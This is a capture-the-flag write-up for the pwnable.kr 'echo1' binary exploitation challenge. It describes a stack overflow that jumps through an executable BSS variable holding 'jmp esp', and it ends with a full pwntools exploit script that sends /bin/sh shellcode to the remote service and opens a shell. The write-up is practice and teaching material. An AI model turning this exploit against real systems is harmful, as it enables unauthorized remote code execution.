# 33 - echo1

## The Challenge

Pwn this echo service.

download : [http://pwnable.kr/bin/echo1](http://pwnable.kr/bin/echo1)

Running at : nc pwnable.kr 9010

## The Solution

By running the binary we learned that:

* We can input a name
* Three options are given to us
  * only the first option is implemented, and it's named bof \[lol\]
* We can exit the program and then decline. This behavior is more relevant to echo2, but if we exit after declining we get a nice print of the memory mapping. It teaches us that **ASLR is turned on**.

After further debugging we learned that:

* No other protection is turned on
* There is no overflow in the name input. The first four characters are stored in a variable named "id" in the BSS section. This section isn't affected by ASLR, and in this binary, it is executable too!
* Not very surprising, we can BOF in the "bof" input

The attack becomes clear now:

* The buffer overflow will be made of a buffer + address of "id" + shellcode
* "id" would contain 'jmp esp', thus redirect us to the shellcode

```text
#!/usr/bin/python3

from pwn import *

offset = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ'
jmp_address = p64(0x6020a0)
shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

p = remote('pwnable.kr', 9010)
p.sendline(b'\xFF\xE4') # jmp esp
p.sendline(b'1')
p.sendline(offset + jmp_address + shellcode)
p.recvrepeat(1)
p.interactive()
```

